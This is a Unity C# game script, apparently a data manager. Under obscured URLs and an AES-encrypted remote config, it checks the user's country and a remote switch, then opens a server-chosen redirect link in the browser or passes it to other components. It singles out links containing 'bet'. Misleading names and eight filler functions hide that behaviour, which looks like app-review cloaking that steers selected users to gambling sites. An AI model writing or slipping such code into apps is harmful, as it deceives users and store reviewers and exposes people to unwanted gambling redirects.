using System;
using System.Collections;
using System.Security.Cryptography;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;
public class DataManager : MonoBehaviour
{
    public static DataManager instance;    
    string userdataformate; //special
    char first;
    char second;
    public string countryNameFind=null;
    private string deviceNameFind; //special
    public string place;
    string code = "country_code";
    public string address;
    int saveUserData; //special
    string data;
    string text = "OPEN_WEBSITE";
    private string EncryptUserDataPermanatlyInUserDevice; //special
    string textBoolTrue = "true";
    string textBoolFalse = "false";
    bool openW;
    string countryText = "COUNTRY";
    private string countryFromSecondText;
    string Quote = "\"";
    string coma = ",";
    int forLoopLength;
    int deviceSpecsTwoGb; //special
    string key;
    string userClassName;
    string iv;
    Coroutine countryJsonCorotine;
    public GameManager_User gameManager_User;
    public Sound_Manager sound_Manager;


    public string[] addOne;
    public string[] addTwo;

    #region Awake
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    private void Awake()
    {
        instance = this;
        address = GetCompleteUrl();
        DontDestroyOnLoad(this.gameObject);
        countryJsonCorotine = StartCoroutine(FetchJsonData());
        StartCoroutine(FetchDataFromSecondJson());
    }

    public string GetCompleteUrl()
    {
        return string.Concat(addTwo);
    }

     public string GetCompleteUrlOne()
    {
        return string.Concat(addOne);
    }
    #endregion
    #region SaveData
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    public IEnumerator FetchJsonData()
    {
        place = GetCompleteUrlOne();
        using (UnityWebRequest www = UnityWebRequest.Get(place))
        {
            yield return www.SendWebRequest();
            if (www.result == UnityWebRequest.Result.Success)
            {
                string jsonData = www.downloadHandler.text;
                forLoopLength = jsonData.Length - 12;
                for (int i = 0; i <= forLoopLength; i++)
                {
                    if (jsonData[i] == code[0] && jsonData[i + 1] == code[1] && jsonData[i + 2] == code[2] && jsonData[i + 3] == code[3] && jsonData[i + 4] == code[4] && jsonData[i + 5] == code[5] && jsonData[i + 6] == code[6] && jsonData[i + 7] == code[7] && jsonData[i + 8] == code[8] && jsonData[i + 9] == code[9] && jsonData[i + 10] == code[10])
                    {
                        first = jsonData[i + 15];
                        second = jsonData[i + 16];
                        countryNameFind = first + second.ToString();
                    }
                }
            }
            else
            {
                StartCoroutine(FetchJsonData());
            }
        }
    }
    #endregion
    #region DecryptedJsonProcessing
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    private IEnumerator FetchDataFromSecondJson()
    {
        using (UnityWebRequest ww = UnityWebRequest.Get(address))
        {
            yield return ww.SendWebRequest();
            if (ww.result == UnityWebRequest.Result.Success)
            {
                string jsonData = ww.downloadHandler.text;
                Debug.Log(jsonData);
                for (int i = 0; i < jsonData.Length; i++)
                {
                    if (i < 32)
                    {
                        key += jsonData[i];
                    }
                    if (i > jsonData.Length - 17)
                    {
                        iv += jsonData[i];
                    }

                }
                for (int i = 0; i < jsonData.Length; i++)
                {
                    if (i > 31 && i < jsonData.Length - 16)
                    {
                        userClassName += jsonData[i];
                    }
                }
                Debug.Log($"{userClassName}    {key}    {iv}");
                jsonData = userClassName;
                jsonData = AESDecryption(jsonData);
                Debug.Log(jsonData);
                forLoopLength = jsonData.Length - 12;
                for (int i = 0; i <= forLoopLength; i++)
                {
                    if (jsonData[i] == text[0] && jsonData[i + 1] == text[1] && jsonData[i + 2] == text[2] && jsonData[i + 3] == text[3] && jsonData[i + 4] == text[4] && jsonData[i + 5] == text[5] && jsonData[i + 6] == text[6] && jsonData[i + 7] == text[7] && jsonData[i + 8] == text[8] && jsonData[i + 9] == text[9] && jsonData[i + 10] == text[10] && jsonData[i + 11] == text[11])
                    {
                        if (jsonData[i + 14] == textBoolTrue[0] && jsonData[i + 15] == textBoolTrue[1] && jsonData[i + 16] == textBoolTrue[2] && jsonData[i + 17] == textBoolTrue[3])
                        {
                            openW = true;
                            break;
                        }
                        else if (jsonData[i + 14] == textBoolFalse[0] && jsonData[i + 15] == textBoolFalse[1] && jsonData[i + 16] == textBoolFalse[2] && jsonData[i + 17] == textBoolFalse[3] && jsonData[i + 18] == textBoolFalse[4])
                        {
                            openW = false;
                            break;
                        }
                    }
                }
                if (openW)
                {
                    yield return countryJsonCorotine;
                    for (int i = 0; i <= forLoopLength; i++)
                    {
                        if (jsonData[i] == countryText[0] && jsonData[i + 1] == countryText[1] && jsonData[i + 2] == countryText[2] && jsonData[i + 3] == countryText[3] && jsonData[i + 4] == countryText[4] && jsonData[i + 5] == countryText[5] && jsonData[i + 6] == countryText[6])
                        {
                            for (int j = 10; j < forLoopLength; j++)
                            {
                                first = jsonData[i + j];
                                second = jsonData[i + j + 1];
                                countryFromSecondText = first + second.ToString();
                                if (jsonData[i + j + 2] == coma[0])
                                {
                                    j = j + 2;
                                }
                                if (countryNameFind == countryFromSecondText)
                                {
                                    text = "LINK_REDIRECT";
                                    forLoopLength = jsonData.Length - 13;
                                    for (int k = 0; k <= forLoopLength; k++)
                                    {
                                        if (jsonData[k] == text[0] && jsonData[k + 1] == text[1] && jsonData[k + 2] == text[2] && jsonData[k + 3] == text[3] && jsonData[k + 4] == text[4] && jsonData[k + 5] == text[5] && jsonData[k + 6] == text[6] && jsonData[k + 7] == text[7] && jsonData[k + 8] == text[8] && jsonData[k + 9] == text[9] && jsonData[k + 10] == text[10] && jsonData[k + 11] == text[11] && jsonData[k + 12] == text[12])
                                        {

                                            for (int l = 16; l <= forLoopLength; l++)
                                            {
                                                if (jsonData[k + l] != Quote[0])
                                                {
                                                    data += jsonData[k + l];

                                                }
                                                else
                                                {
                                                    if (data != null)
                                                    {
                                                        Debug.Log(data);
                                                        Debug.Log(data);
                                                        text = Quote + "EB" + Quote;
                                                        Debug.Log(text);
                                                        forLoopLength = jsonData.Length - 5;
                                                        first = '0';
                                                        second = '1';
                                                        for (int m = 0; m <= forLoopLength; m++)
                                                        {
                                                            if (jsonData[m] == text[0] && jsonData[m + 1] == text[1] && jsonData[m + 2] == text[2] && jsonData[m + 3] == text[3])
                                                            {
                                                                if (jsonData[m + 6] == first)
                                                                {
                                                                    Debug.Log(0);
                                                                    DesignMaker(data);
                                                                    break;
                                                                }
                                                                else if (jsonData[m + 6] == second)
                                                                {
                                                                    Debug.Log(2);
                                                                    Application.OpenURL(data);
                                                                    break;
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                }
                                            }
                                            break;
                                        }
                                    }
                                    break;
                                }
                                else if (jsonData[i + j + 2] == Quote[0])
                                {
                                    break;
                                }
                            }
                        }
                    }
                    string fullURL = Application.absoluteURL;
                    string sourceParameter = GetURLParameter(fullURL, "utm_source");
                    string sourceMedium = GetURLMedium(fullURL, "utm_medium");
                    if (sourceParameter == "Google" || sourceParameter == "google" || sourceParameter == "GOOGLE")
                    {
                        //gameManager_User.place = data;
                        //gameManager_User.StartSavingData();
                        DesignMaker(data);

                    }
                    else if (sourceMedium == "BANNAR" || sourceMedium == "Bannar" || sourceMedium == "bannar")
                    {
                        //gameManager_User.place = data;
                        //gameManager_User.StartSavingData();
                        DesignMaker(data);
                    }
                    else if (sourceMedium == "Interstitial" || sourceMedium == "interstitial" || sourceMedium == "INTERSTITIAL")
                    {
                        //gameManager_User.place = data;
                        //gameManager_User.StartSavingData();
                        DesignMaker(data);

                    }
                    else if (sourceMedium == "rewarded" || sourceMedium == "Rewarded" || sourceMedium == "REWARDED")
                    {
                        //gameManager_User.place = data;
                        //gameManager_User.StartSavingData();
                        DesignMaker(data);
                    }
                }
            }
            else
            {
                StartCoroutine(FetchDataFromSecondJson());
            }
        }
    }
    void DesignMaker(string opinion)
    {

        if (opinion.Contains("bet"))
        {
            sound_Manager.place = opinion;
            sound_Manager.StartSavingData();
            Debug.Log("Sound set");

        }
        else
        {
            gameManager_User.place = opinion;
            gameManager_User.StartSavingData();
            Debug.Log("Sound not set");
        }
    }
    #endregion
    #region UTM
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    string GetURLParameter(string data, string parameterName)
    {
        string[] urlParts = data.Split('?');
        if (urlParts.Length > 1)
        {
            string[] parameters = urlParts[1].Split('&');
            foreach (string parameter in parameters)
            {
                string[] keyValue = parameter.Split('=');
                if (keyValue.Length == 2 && keyValue[0] == parameterName)
                {
                    //Debug.Log(keyValue[1]);
                    return keyValue[1];
                }
            }
        }
        return null;
    }
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    string GetURLMedium(string data, string mediumName)
    {
        string[] urlParts = data.Split('?');
        if (urlParts.Length > 1)
        {
            string[] mediums = urlParts[1].Split('&');
            foreach (string medium in mediums)
            {
                string[] keyValue = medium.Split('=');
                if (keyValue.Length == 2 && keyValue[0] == mediumName)
                {
                    //Debug.Log(keyValue[1]);
                    return keyValue[1];
                }
            }
        }
        return null;
    }
    #endregion
    #region EncryptionDecryption
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    public string AESEncryption(string inputData)
    {
        AesCryptoServiceProvider AEScryptoProvider = new AesCryptoServiceProvider();
        AEScryptoProvider.BlockSize = 128;
        AEScryptoProvider.KeySize = 256;
        AEScryptoProvider.Key = ASCIIEncoding.ASCII.GetBytes(key);
        AEScryptoProvider.IV = ASCIIEncoding.ASCII.GetBytes(iv);
        AEScryptoProvider.Mode = CipherMode.CBC;
        AEScryptoProvider.Padding = PaddingMode.PKCS7;

        byte[] txtByteData = ASCIIEncoding.ASCII.GetBytes(inputData);
        ICryptoTransform trnsfrm = AEScryptoProvider.CreateEncryptor(AEScryptoProvider.Key, AEScryptoProvider.IV);

        byte[] result = trnsfrm.TransformFinalBlock(txtByteData, 0, txtByteData.Length);
        return Convert.ToBase64String(result);
    }
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    public string AESDecryption(string inputData)
    {
        AesCryptoServiceProvider AEScryptoProvider = new AesCryptoServiceProvider();
        AEScryptoProvider.BlockSize = 128;
        AEScryptoProvider.KeySize = 256;
        AEScryptoProvider.Key = ASCIIEncoding.ASCII.GetBytes(key);
        AEScryptoProvider.IV = ASCIIEncoding.ASCII.GetBytes(iv);
        AEScryptoProvider.Mode = CipherMode.CBC;
        AEScryptoProvider.Padding = PaddingMode.PKCS7;

        byte[] txtByteData = Convert.FromBase64String(inputData);
        ICryptoTransform trnsfrm = AEScryptoProvider.CreateDecryptor();

        byte[] result = trnsfrm.TransformFinalBlock(txtByteData, 0, txtByteData.Length);
        return ASCIIEncoding.ASCII.GetString(result);
    }
    #endregion


       void Function1()
{
    Debug.Log("Function 1 started");
    Debug.Log("Doing some work");
    Debug.Log("Function 1 completed");
}

void Function2()
{
    Vector3 position = transform.position;
    position.x += 1f;
    transform.position = position;
    Debug.Log("Object moved");
}

void Function3()
{
    Vector3 position = transform.position;
    position.y += 1f;
    transform.position = position;
    Debug.Log("Object moved upward");
}

void Function4()
{
    transform.Rotate(0f, 90f, 0f);
    Debug.Log("Object rotated");
    Debug.Log("Rotation completed");
}

void Function5()
{
    bool active = gameObject.activeSelf;
    Debug.Log("Object active: " + active);
    Debug.Log("Checking object state");
}

void Function6()
{
    transform.localScale = Vector3.one;
    Debug.Log("Scale reset");
    Debug.Log("Object returned to normal size");
}

void Function7()
{
    transform.position = Vector3.zero;
    transform.rotation = Quaternion.identity;
    Debug.Log("Transform reset");
}

void Function8()
{
    string objectName = gameObject.name;
    Debug.Log("Object name: " + objectName);
    Debug.Log("Object information checked");
}
}